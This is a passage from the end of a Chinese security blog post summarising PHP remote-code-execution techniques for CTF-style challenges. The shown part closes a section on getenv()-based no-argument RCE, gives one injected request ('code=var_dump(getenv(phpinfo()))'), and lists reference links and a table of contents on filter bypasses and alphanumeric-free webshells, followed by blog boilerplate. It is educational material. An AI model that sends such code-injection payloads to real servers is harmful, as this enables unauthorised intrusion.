+</code></pre>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122171114135.png" alt="image-20221122171114135"></p>
+<p>我们这么写达到了什么效果呢?—&gt;随机获取一个环境变量的值</p>
+<p>我们则可用爆破的方式获取数组中任意位置需要的值，那么即可使用getenv()，并获取指定位置的恶意参数</p>
+<p>说实话我个人对这种做法还是比较懵逼，我并没有找到好的方法去执行命令，我观看了网上的文章都是到这一步就停下了，唯一达到的效果就是执行了phpinfo()?其实也不必要这么麻烦的</p>
+<pre><code class="php">POST /index.php?code=var_dump(getenv(phpinfo())); HTTP/1.1
+</code></pre>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41315957/article/details/118855865">https://blog.csdn.net/qq_41315957/article/details/118855865</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Manuffer/article/details/120738755">https://blog.csdn.net/Manuffer/article/details/120738755</a></p>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">sakura</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/">https://sakurahack-y.github.io/2022/11/21/rce考点总结/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">sakura的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/rce/">rce</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFrce"><span class="toc-number">2.</span> <span class="toc-text">什么是rce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">3.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="toc-number">4.</span> <span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0"><span class="toc-number">5.</span> <span class="toc-text">常见函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">5.1.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">5.2.</span> <span class="toc-text">代码执行</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7"><span class="toc-number">6.</span> <span class="toc-text">利用技巧</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce"><span class="toc-number">7.</span> <span class="toc-text">无数字字母rce</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">7.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87"><span class="toc-number">7.2.</span> <span class="toc-text">取反绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87"><span class="toc-number">7.3.</span> <span class="toc-text">异或绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%88%96%E7%BB%95%E8%BF%87"><span class="toc-number">7.4.</span> <span class="toc-text">二进制或绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-number">7.5.</span> <span class="toc-text">上传临时文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Dwebshell"><span class="toc-number">7.6.</span> <span class="toc-text">构造无数字字母webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E6%88%96webshell"><span class="toc-number">7.6.1.</span> <span class="toc-text">异或webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%96%E5%8F%8Dwebshell"><span class="toc-number">7.6.2.</span> <span class="toc-text">取反webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%A2%9Ewebshell"><span class="toc-number">7.6.3.</span> <span class="toc-text">自增webshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0rce"><span class="toc-number">8.</span> <span class="toc-text">无参数rce</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">8.1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">8.2.</span> <span class="toc-text">常用函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dirname-amp-chdir"><span class="toc-number">8.3.</span> <span class="toc-text">dirname() &amp; chdir()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getallheaders"><span class="toc-number">8.4.</span> <span class="toc-text">getallheaders</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-defined-vars"><span class="toc-number">8.5.</span> <span class="toc-text">get_defined_vars()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session-id"><span class="toc-number">8.6.</span> <span class="toc-text">session_id()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getenv"><span class="toc-number">8.7.</span> <span class="toc-text">getenv</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">9.</span> <span class="toc-text">参考链接</span></a></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">Nodejs漏洞总结 &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
+.night .v[data-class=v] a:hover { color: #216C73 !important; }
+.night .v[data-class=v] li { list-style: inherit; }
+.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
+.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
+.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
+.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
+</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'',
+  appKey:'',
+  lang: 'zh-cn',
+  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
+  avatar:'identicon',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2016 - 2022 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>
